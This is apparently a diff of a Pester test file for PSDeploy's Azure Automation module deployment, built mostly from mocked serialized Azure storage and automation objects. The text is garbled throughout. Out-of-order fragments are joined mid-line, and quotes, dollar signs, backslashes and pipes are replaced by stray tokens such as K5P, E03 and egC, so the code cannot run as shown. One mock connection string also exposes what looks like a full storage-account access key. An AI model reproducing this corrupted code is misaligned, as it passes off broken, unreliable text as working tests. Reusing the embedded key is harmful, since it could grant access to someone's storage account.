+                <T>System.Object</T>
+                </TN>
+                <DCT />
+            </Obj>
+            <S N=K5PPropertiesK5P>Microsoft.Azure.Storage.Blob.BlobContainerProperties</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PPermissionK5P RefId=K5P3K5P>
+            <TN RefId=K5P3K5P>
+            <T>Microsoft.Azure.Storage.Blob.BlobContainerPermissions</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Storage.Blob.BlobContainerPermissions</ToString>
+            <Props>
+            <S N=K5PPublicAccessK5P>Container</S>
+            <Obj N=K5PSharedAccessPoliciesK5P RefId=K5P4K5P>
+                <TN RefId=K5P4K5P>
+                <T>Microsoft.Azure.Storage.Blob.SharedAccessBlobPolicies</T>
+                <T>System.Object</T>
+                </TN>
+                <IE />
+            </Obj>
+            </Props>
+        </Obj>
+        <Obj N=K5PPublicAccessK5P RefId=K5P5K5P>
+            <TN RefId=K5P5K5P>
+            <T>Microsoft.Azure.Storage.Blob.BlobContainerPublicAccessType</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Container</ToString>
+            <I32>1</I32>
+        </Obj>
+        <Obj N=K5PLastModifiedK5P RefId=K5P6K5P>
+            <TN RefId=K5P6K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToStrin','ContinuationTokenK5P />
+        <Obj N=K5PBlobContainerClientK5P RefId=K5P7K5P>
+            <TN RefId=K5P7K5P>
+            <T>Azure.Storage.Blobs.BlobContainerClient</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Azure.Storage.Blobs.BlobContainerClient</ToString>
+            <Props>
+            <URI N=K5PUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend</URI>
+            <S N=K5PAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PNameK5P>psdepend</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PBlobContainerPropertiesK5P RefId=K5P8K5P>
+            <TN RefId=K5P8K5P>
+            <T>Azure.Storage.Blobs.Models.BlobContainerProperties</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Azure.Storage.Blobs.Models.BlobContainerProperties</ToString>
+            <Props>
+            <S N=K5PLastModifiedK5P>05/04/2020 14:45:45 +00:00</S>
+            <S N=K5PLeaseStatusK5P>Unlocked</S>
+            <S N=K5PLeaseStateK5P>Available</S>
+            <S N=K5PLeaseDur','       <Nil N=K5PResourceTypeK5P />
+            <Nil N=K5PKindK5P />
+            <Nil N=K5PLocationsK5P />
+            <Nil N=K5PCapabilitiesK5P />
+            <Nil N=K5PRestrictionsK5P />
+            </Props>
+        </Obj>
+        <S N=K5PKindK5P>StorageV2</S>
+        <Obj N=K5PEncryptionK5P RefId=K5P2K5P>
+            <TN RefId=K5P2K5P>
+            <T>Microsoft.Azure.Management.Storage.Models.Encryption</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Management.Storage.Models.Encryption</ToString>
+            <Props>
+            <S N=K5PServicesK5P>Microsoft.Azure.Management.Storage.Models.EncryptionServices</S>
+            <S N=K5PKeySourceK5P>Microsoft.Storage</S>
+            <Nil N=K5PKeyVaultPropertiesK5P />
+            </Props>
+        </Obj>
+        <Obj N=K5PAccessTierK5P RefId=K5P3K5P>
+            <TN RefId=K5P3K5P>
+            <T>Microsoft.Azure.Management.Storage.Models.AccessTier</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Hot</ToString>
+            <I32>0</I32>
+        </Obj>
+        <DT N=K5PCreationTimeK5P>2020-05-03T10:59:39.4378401Z</DT>
+        <Nil N=K5PCustomDomainK5P />
+        <Nil N=K5PIdentityK5P />
+        <Nil N=K5PLastGeoFailoverTimeK5P />
+        <Obj N=K5PPrimaryEndpointsK5P RefId=K5P4K5P>
+            <TN RefId=K5P4K5P>
+            <T>Microsoft.Azure.Management.Storage.Models.Endpoints</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Management.Storage.Models.Endpoints</ToString>
+            <Props>
+            <S N=K5PBlobK5P>https://aadeploymentstor.blob.core.windows.net/</S>
+            <S N=K5PQueueK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+            <S N=K5PTableK5P>https://aadeploymentstor.table.core.windows.net/</S>
+            <S N=K5PFileK5P>https://aadeploymentstor.file.core.windows.net/</S>
+            <S N=K5PWebK5P>https://aade','ksK5P>637242002545370000</I64>
+            <TS N=K5PTimeOfDayK5P>PT17H44M14.537S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <S N=K5PProvisioningStateK5P>Succeeded</S>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+           ','     </Obj>
+        <S N=K5PNameK5P>psdepend</S>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock New-AzStorageContext {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</ToString>
+        <Props>
+        <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+        <S N=K5PBlobEndPointK5P>https://aadeploymentstor.blob.core.windows.net/</S>
+        <S N=K5PTableEndPointK5P>https://aadeploymentstor.table.core.windows.net/</S>
+        <S N=K5PQueueEndPointK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+        <S N=K5PFileEndPointK5P>https://aadeploymentstor.file.core.windows.net/</S>
+        <Obj N=K5PContextK5P RefId=K5P1K5P>
+            <TNRef RefId=K5P0K5P />
+            <ToString>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</ToString>
+            <Props>
+            <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PBlobEndPointK5P>https://aadeploymentstor.blob.core.windows.net/</S>
+            <S N=K5PTableEndPointK5P>https://aadeploymentstor.table.core.windows.net/</S>
+            <S N=K5PQueueEndPointK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+            <S N=K5PFileEndPointK5P>https://aadeploymentstor.file.core.windows.net/</S>
+            <Ref N=K5PContextK5P RefId=K5P1K5P />
+            <S N=K5PNameK5P></S>
+            <S N=K5PStorageAccountK5P>BlobEndpoint=https://aadeploymentstor.blob.core.windows.net/;QueueEnd','S N=K5PSnapshotQualifiedStorageUriK5P>Primary = 5hFhttps://aadeploymentstor.blob.core.windows.net/psdepend/PSDepend.zip5hF; Secondary = 5hF5hF</S>
+            <Nil N=K5PCopyStateK5P />
+            <S N=K5PNameK5P>PSDepend.zip</S>
+            <S N=K5PContainerK5P>Microsoft.Azure.Storage.Blob.CloudBlobContainer</S>
+            <S N=K5PParentK5P>Microsoft.Azure.Storage.Blob.CloudBlobDirectory</S>
+            <S N=K5PBlobTypeK5P>BlockBlob</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PBlobTypeK5P RefId=K5P3K5P>
+            <TN RefId=K5P3K5P>
+            <T>Microsoft.Azure.Storage.Blob.BlobType</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>BlockBlob</ToString>
+            <I32>2</I32>
+        </Obj>
+        <I64 N=K5PLengthK5P>2274</I64>
+        <B N=K5PIsDeletedK5P>false</B>
+        <Obj N=K5PBlobClientK5P RefId=K5P4K5P>
+            <TN RefId=K5P4K5P>
+            <T>Azure.Storage.Blobs.BlobClient</T>
+            <T>Azure.Storage.Blobs.Specialized.BlobBaseClient</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Azure.Storage.Blobs.BlobClient</ToString>
+            <Props>
+            <URI N=K5PUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend/PSDepend.zip</URI>
+            <S N=K5PAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PBlobContainerNameK5P>psdepend</S>
+            <S N=K5PNameK5P>PSDepend.zip</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PBlobPropertiesK5P RefId=K5P5K5P>
+            <TN RefId=K5P5K5P>
+            <T>Azure.Storage.Blobs.Models.BlobProperties</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Azure.Storage.Blobs.Models.BlobProperties</ToString>
+            <Props>
+            <S N=K5PLastModifiedK5P>05/12/2020 11:22:11 +00:00</S>
+            <S N=K5PCreatedOnK5P>05/04/2020 14:45:45 +00:00</S>
+            <Obj N=K5PMetadataK5P RefId=K5P6K5P>
+          ','     <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</ToString>
+            <Props>
+            <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PBlobEndPointK5P>https://aadeploymentstor.blob.core.windows.net/</S>
+            <S N=K5PTableEndPointK5P>https://aadeploymentstor.table.core.windows.net/</S>
+            <S N=K5PQueueEndPointK5P>https://aadeploymentstor.queue.core.windows.net/</S>
+            <S N=K5PFileEndPointK5P>https://aadeploymentstor.file.core.windows.net/</S>
+            <Ref N=K5PContextK5P RefId=K5P8K5P />
+            <S N=K5PNameK5P></S>
+            <S N=K5PStorageAccountK5P>BlobEn','.Blob.BlobContainerPermissions</ToString>
+            <Props>
+            <S N=K5PPublicAccessK5P>Container</S>
+            <Obj N=K5PSharedAccessPoliciesK5P RefId=K5P4K5P>
+                <TN RefId=K5P4K5P>
+                <T>Microsoft.Azure.Storage.Blob.SharedAccessBlobPolicies</T>
+                <T>System.Object</T>
+                </TN>
+                <IE />
+            </Obj>
+            </Props>
+        </Obj>
+        <Obj N=K5PPublicAccessK5P RefId=K5P5K5P>
+            <TN RefId=K5P5K5P>
+            <T>Microsoft.Azure.Storage.Blob.BlobContainerPublicAccessType</T>
+            <T>System.Enum</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Container</ToString>
+            <I32>1</I32>
+        </Obj>
+        <Obj N=K5PLastModifiedK5P RefId=K5P6K5P>
+            <TN RefId=K5P6K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>05/04/2020 14:45:45 +00:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-04T14:45:45</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-04T14:45:45Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-04T17:45:45+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-04T00:00:00</DT>
+            <I32 N=K5PDayK5P>4</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>125</I32>
+            <I32 N=K5PHourK5P>14</I32>
+            <I32 N=K5PMillisecondK5P>0</I32>
+            <I32 N=K5P','er</S>
+            <B N=K5PHasImmutabilityPolicyK5P>false</B>
+            <B N=K5PHasLegalHoldK5P>false</B>
+            <S N=K5PDefaultEncryptionScopeK5P>E03account-encryption-key</S>
+            <B N=K5PPreventEncryptionScopeOverrideK5P>false</B>
+            <S N=K5PETagK5P>K5P0x8D7F039D3D0C5C5K5P</S>
+            <Obj N=K5PMetadataK5P RefId=K5P9K5P>
+                <TNRef RefId=K5P2K5P />
+                <DCT />
+            </Obj>
+            </Props>
+        </Obj>
+        <Obj N=K5PContextK5P RefId=K5P10K5P>
+            <TN RefId=K5P9K5P>
+            <T>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.WindowsAzure.Commands.Storage.AzureStorageContext</ToString>
+            <Props>
+            <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PBlobEndPointK5P>https://aadeploymentstor.blob.core.windows.net/</S>
+            <S N=K',' 5hFCmdletBinding5hF
+            }
+
+            (5hF','         <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>32</I32>
+            <I64 N=K5PTicksK5P>637242109526170000</I64>
+            <I64 N=K5PUtcTicksK5P>637242001526170000</I64>
+            <TS N=K5PTimeOfDayK5P>PT17H42M32.617S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Obj N=K5PLastModifiedTimeK5P RefId=K5P2K5P>
+            <TNRef RefId=K5P1K5P />
+            <ToString>05/12/2020 14:05:27 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-12T14:05:27.527</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-12T11:05:27.527Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-12T14:05:27.527+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-12T00:00:00</DT>
+            <I32 N=K5PDayK5P>12</I32>
+            <S N=K5PDayOfWeekK5P>Tuesday</S>
+            <I32 N=K5PDayOfYearK5P>133</I32>
+            <I32 N=K5PHourK5P>14</I32>
+            <I32 N=K5PMillisecondK5P>527</I32>
+            <I32 N=K5PMinuteK5P>5</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>27</I32>
+            <I64 N=K5PTicksK5P>637248891275270000</I64>
+            <I64 N=K5PUtcTicksK5P>637248783275270000</I64>
+            <TS N=K5PTimeOfDayK5P>PT14H5M27.527S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <S N=K5PProvisioningStateK5P>Succeeded</S>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock Get-AzStorageAccount {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.Azure.Commands.Management.Storage.Models.PSStorageAccount</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString />
+        <Props>
+        <S N=K5PResourceGroupNameK5P>SATestAutomationAndMonitoringRG</S>
+        <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+        <S N=K5PIdK5P>/subscriptions/eb31e8d0-5a14-4eea-87b9-66581523e545/resourceGroups/SATestAutomationAndMonitoringRG/providers/Microsoft.Storage/storageAccounts/aadeploymentstor</','               E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+
+            It 5hFshould get an Automation account5hF {
+                {
+                    Invoke-PSDeploy @Verbose -Path K5PE03ProjectRootegCTestsegCartifactsegCDeploymentsAzureAutomationModule-PublicModule.psdeploy.ps1K5P -Force
+                    Assert-MockCalled Get-AzAutomationAccount -Exactly 1 -Scope It
+                }
+            }
+
+            It 5hFshould query the Automation account for already imported module5hF {
+                {
+                    Invoke-PSDeploy @Verbose -Path K5PE03ProjectRootegCTestsegCartifactsegCDeploymentsAzureAutomationModule-PublicModule.psdeploy.ps1K5P -Force
+                    Assert-MockCalled Get-AzAutomationModule -Exactly 1 -Scope It
+                }
+            }
+
+            It 5hFshould import the module into Automation account5hF {
+                {
+                    Invoke-PSDeploy @Verbose -Path K5PE03ProjectRootegCTestsegCartifactsegCDeploymentsAzureAutomationModule-PublicModule.psdeploy.ps1K5P -Force
+                 ','tor;AccountKey=aYnf1etfwPfXJ2viMYc/DdUcZPo2ysm/42Ov8zEewRGvv32c0VtumseRzoRDG75a7BgCNFiDR28y//xqqBB+Rw==</S>
+            <Obj N=K5PExtendedPropertiesK5P RefId=K5P12K5P>
+                <TNRef RefId=K5P7K5P />
+                <DCT />
+            </Obj>
+            </Props>
+        </Obj>
+        <Obj N=K5PExtendedPropertiesK5P RefId=K5P13K5P>
+            <TNRef RefId=K5P7K5P />
+            <DCT />
+        </Obj>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock Get-AzStorageContainer {
+                #region MockData
+       ','if (-not E03ENV:BHProjectPath) {
+    Set-BuildEnvironment -Path E03PSScriptRootegC..egC.. -Force
+}
+Remove-Module PSDeploy -ErrorAction SilentlyContinue
+Import-Module E03PSScriptRootegC..egC..egCPSDeployegCPSDeploy.psd1
+
+InModuleScope 5hFPSDeploy5hF {
+    E03PSVersion = E03PSVersionTable.PSVersion.Major
+    E03ProjectRoot = E03ENV:BHProjectPath
+
+    # Define path to the deployment script itself
+    E03sutPath = K5PE03ProjectRootegCPSDeployegCPSDeployScriptsegCAzureAutomationModule.ps1K5P
+
+    E03Verbose = @{}
+    if (E03ENV:BHBranchName -notlike K5PmasterK5P -or E03env:BHCommitMessage -match K5P!verboseK5P) {
+        E03Verbose.add(K5PVerboseK5P, E03True)
+    }
+
+    Describe K5PAzureAutomationModuleScript PSE03PSVersionK5P {
+
+        Context K5PCode StyleK5P {
+            It K5Pshould define CmdletBindingK5P {
+                E03sutPath LUK Should Contain','rK5P>125</I32>
+            <I32 N=K5PHourK5P>17</I32>
+            <I32 N=K5PMillisecondK5P>617</I32>
+            <I32 N=K5PMinuteK5P>42</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>32</I32>
+            <I64 N=K5PTicksK5P>637242109526170000</I64>
+            <I64 N=K5PUtcTicksK5P>637242001526170000</I64>
+            <TS N=K5PTimeOfDayK5P>PT17H42M32.617S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Obj N=K5PLastModifiedTimeK5P RefId=K5P2K5P>
+            <TNRef RefId=K5P1K5P />
+            <ToString>05/12/2020 14:05:27 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-12T14:05:27.527</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-12T11:05:27.527Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-12T14:05:27.527+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-12T00:00:00</DT>
+            <I32 N=K5PDayK5P>12</I32>
+            <S N=K5PDayOfWeekK5P>Tuesday</S>
+            <I32 N=K5PDayOfYearK5P>133</I32>
+            <I32 N=K5PHourK5P>14</I32>
+            <I32 N=K5PMillisecondK5P>527</I32>
+            <I32 N=K5PMinuteK5P>5</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>27</I32>
+            <I64 N=K5PTicksK5P>637248891275270000</I64>
+            <I64 N=K5PUtcTicksK5P>637248783275270000</I64>
+            <TS N=K5PTimeOfDayK5P>PT14H5M27.527S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <S N=K5PProvisioningStateK5P>Succeeded</S>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock Get-AzStorageAccount {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.Azure.Commands.Management.Storage.Models.PSStorageAccount</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString />
+        <Props>
+        <S N=K5PResourceGroupNameK5P>SATestAutomationAndMonitoringRG</S>
+        <S N=K5PStorageAccountNameK5P>aadeploymentstor</S>
+        <S N=K5PIdK5P>/subscriptions/eb31e8d0-5a14-4eea-87b9-66581523e545/resourceGroups/SATestAutomationAndMonitoringRG/providers/Microsoft.Storage/storageAccounts/aadeploymentstor</S>
+        <S N=K5PLocationK5P>westeurope</S>
+        <Obj N=K5PSkuK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>Microsoft.Azure.Commands.Management.Storage.Models.PSSku</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Microsoft.Azure.Commands.Management.Storage.Models.PSSku</ToString>
+            <Props>
+            <S N=K','32>
+            <I32 N=K5PMinuteK5P>45</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT0S</TS>
+            <I32 N=K5PSecondK5P>45</I32>
+            <I64 N=K5PTicksK5P>637242003450000000</I64>
+            <I64 N=K5PUtcTicksK5P>637242003450000000</I64>
+            <TS N=K5PTimeOfDayK5P>PT14H45M45S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Nil N=K5PContinuationTokenK5P />
+        <Obj N=K5PBlobContainerClientK5P RefId=K5P7K5P>
+            <TN RefId=K5P7K5P>
+            <T>Azure.Storage.Blobs.BlobContainerClient</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Azure.Storage.Blobs.BlobContainerClient</ToString>
+            <Props>
+            <URI N=K5PUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend</URI>
+            <S N=K5PAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PNameK5P>psdepend</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PBlobContainerPropertiesK5P RefId=K5P8K5P>
+            <TN RefId=K5P8K5P>
+            <T>Azure.Storage.Blobs.Models.BlobContainerProperties</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Azure.Storage.Blobs.Models.BlobContainerProperties</ToString>
+            <Props>
+            <S N=K5PLastModifiedK5P>05/04/2020 14:45:45 +00:00</S>
+            <S N=K5PLeaseStatusK5P>Unlocked</S>
+            <S N=K5PLeaseStateK5P>Available</S>
+            <S N=K5PLeaseDurationK5P>Infinite</S>
+            <S N=K5PPublicAccessK5P>BlobContainer</S>
+            <B N=K5PHasImmutabilityPolicyK5P>false</B>
+            <B N=K5PHasLegalHoldK5P>false</B>
+            <S N=K5PDefaultEncryptionScopeK5P>E03account-encryption-key</S>
+            <B N','            #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.Azure.Commands.Automation.Model.AutomationAccount</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.Azure.Commands.Automation.Model.AutomationAccount</ToString>
+        <Props>
+        <S N=K5PSubscriptionIdK5P>c49124fa-befd-4207-a3b7-29c95c41a964</S>
+        <S N=K5PResourceGroupNameK5P>AAResourceGroupName</S>
+        <S N=K5PAutomationAccountNameK5P>AAName</S>
+        <S N=K5PLocationK5P>westeurope</S>
+        <S N=K5PStateK5P>Ok</S>
+        <S N=K5PPlanK5P>Basic</S>
+        <Obj N=K5PCreationTimeK5P RefId=K5P1K5P>
+            <TN RefId=K5P1K5P>
+            <T>System.DateTimeOffset</T>
+            <T>System.ValueType</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>10/02/2017 16:05:15 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2017-10-02T16:05:15.39</DT>
+            <DT N=K5PUtcDateTimeK5P>2017-10-02T13:05:15.39Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2017-10-02T16:05:15.39+03:00</DT>
+            <DT N=K5PDateK5P>2017-10-02T00:00:00</DT>
+            <I32 N=K5PDayK5P>2</I32>
+            <S N=K5PDayO',' </Obj>
+        <Obj N=K5PLastModifiedTimeK5P RefId=K5P2K5P>
+            <TNRef RefId=K5P1K5P />
+            <ToString>05/04/2020 17:44:14 +03:00</ToString>
+            <Props>
+            <DT N=K5PDateTimeK5P>2020-05-04T17:44:14.537</DT>
+            <DT N=K5PUtcDateTimeK5P>2020-05-04T14:44:14.537Z</DT>
+            <DT N=K5PLocalDateTimeK5P>2020-05-04T17:44:14.537+03:00</DT>
+            <DT N=K5PDateK5P>2020-05-04T00:00:00</DT>
+            <I32 N=K5PDayK5P>4</I32>
+            <S N=K5PDayOfWeekK5P>Monday</S>
+            <I32 N=K5PDayOfYearK5P>125</I32>
+            <I32 N=K5PHourK5P>17</I32>
+            <I32 N=K5PMillisecondK5P>537</I32>
+            <I32 N=K5PMinuteK5P>44</I32>
+            <I32 N=K5PMonthK5P>5</I32>
+            <TS N=K5POffsetK5P>PT3H</TS>
+            <I32 N=K5PSecondK5P>14</I32>
+            <I64 N=K5PTicksK5P>637242110545370000</I64>
+            <I64 N=K5PUtcTicksK5P>637242002545370000</I64>
+            <TS N=K5PTimeOfDayK5P>PT17H44M14.537S</TS>
+            <I32 N=K5PYearK5P>2020</I32>
+            </Props>
+        </Obj>
+        <S N=K5PProvisioningStateK5P>Succeeded</S>
+        </Props>
+    </Obj>
+</Objs>
+5hF@
+                #endregion
+
+                E03data = [System.Management.Automation.PSSerializer]::DeserializeAsList(E03mockedSerializedData)
+                E03data
+            }
+            Mock New-AzAutomationModule {
+                #region MockData
+                E03mockedSerializedData = @5hF
+<Objs Version=K5P1.1.0.1K5P xmlns=K5Phttp://schemas.microsoft.com/powershell/2004/04K5P>
+    <Obj RefId=K5P0K5P>
+        <TN RefId=K5P0K5P>
+        <T>Microsoft.Azure.Commands.Automation.Model.Module</T>
+        <T>System.Object</T>
+        </TN>
+        <ToString>Microsoft.Azure.Commands.Automation.Model.Module</ToString>
+        <Props>
+        <S N=K5PResourceGroupNameK5P>AAResourceGroupName</S>
+        <S N=K5PAutomationAccountNameK5P>AAName</S>
+        <S N=K5PNameK5P>PSDepend</S>
+        <B N=K5PIsGlobalK5P>false</B>
+','ploymentstor.z6.web.core.windows.net/</S>
+            <S N=K5PDfsK5P>https://aadeploymentstor.dfs.core.windows.net/</S>
+            <Nil N=K5PMicrosoftEndpointsK5P />
+            <Nil N=K5PInternetEndpointsK5P />
+            </Props>
+        </Obj>
+        <S N=K5PPrimaryLocationK5P>westeurope</S>
+        <Obj N=K5PProvisioningStateK5P RefId=K5P5K5P>
+     ','rK5P>2020</I32>
+            </Props>
+        </Obj>
+        <Nil N=K5PContinuationTokenK5P />
+        <Obj N=K5PBlobContainerClientK5P RefId=K5P7K5P>
+            <TN RefId=K5P7K5P>
+            <T>Azure.Storage.Blobs.BlobContainerClient</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Azure.Storage.Blobs.BlobContainerClient</ToString>
+            <Props>
+            <URI N=K5PUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend</URI>
+            <S N=K5PAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PNameK5P>psdepend</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PBlobContainerPropertiesK5P RefId=K5P8K5P>
+            <TN RefId=K5P8K5P>
+            <T>Azure.Storage.Blobs.Models.BlobContainerProperties</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Azure.Storage.Blobs.Models.BlobContainerProperties</ToString>
+            <Props>
+            <S N=K5PLastModifiedK5P>05/04/2020 14:45:45 +00:00</S>
+            <S N=K5PLeaseStatusK5P>Unlocked</S>
+            <S N=K','s.BlobClient</ToString>
+            <Props>
+            <URI N=K5PUriK5P>https://aadeploymentstor.blob.core.windows.net/psdepend/PSDepend.zip</URI>
+            <S N=K5PAccountNameK5P>aadeploymentstor</S>
+            <S N=K5PBlobContainerNameK5P>psdepend</S>
+            <S N=K5PNameK5P>PSDepend.zip</S>
+            </Props>
+        </Obj>
+        <Obj N=K5PBlobPropertiesK5P RefId=K5P5K5P>
+            <TN RefId=K5P5K5P>
+            <T>Azure.Storage.Blobs.Models.BlobProperties</T>
+            <T>System.Object</T>
+            </TN>
+            <ToString>Azure.Storage.Blobs.Models.BlobProperties</ToString>
+            <Props>
+            <S N=K5PLastModifiedK5P>05/12/2020 11:22:11 +00:00</S>
+            <S N=K5PCreatedOnK5P>05/04/2020 14:45:45 +00:00</S>
+            <Obj N=K5PMetadataK5P RefId=K5P6K5P>
+                <TNRef RefId=K5P2K5P />
+                <DCT />
+            </Obj>
+            <S N=K5PBlobTypeK5P>Block</S>
+            <S N=K5PCopyCompletedOnK5P>01/01/0001 00:00:00 +00:00</S>
+            <Nil N=K5PCopyStatusDescriptionK5P />
+            <Nil N=K5PCopyIdK5P />
+            <Nil N=K5PCopyProgressK5P />
+            <Nil N=K5PCopySourceK5P />
+            <S N=K5PCopyStatusK5P>Pending</S>
+            <B N=K5PIsIncrementalCopyK5P>false</B>
+            <Nil N=K5PDestinationSnapshotK5P />
+            <S N=K5PLeaseDurationK5P>Infinite</S>
+            <S N=K5PLeaseStateK5P>Available</S>
+            <S N=K5PLeaseStatusK5P>Unlocked</S>
+            <I64 N=K5PContentLengthK5P>2274</I64>
+            <S N=K5PContentTypeK5P>application/octet-stream</S>
+            <S N=K5PETagK5P>K5P0x8D7F666B761B3E1K5P</S>
+            <BA N=K5PContentHashK5P>Oz7uCTeqWbwPHzSXuNcHFw==</BA>
+            <Nil N=K5PContentEncodingK5P />
+            <Nil N=K5PContentDispositionK5P />
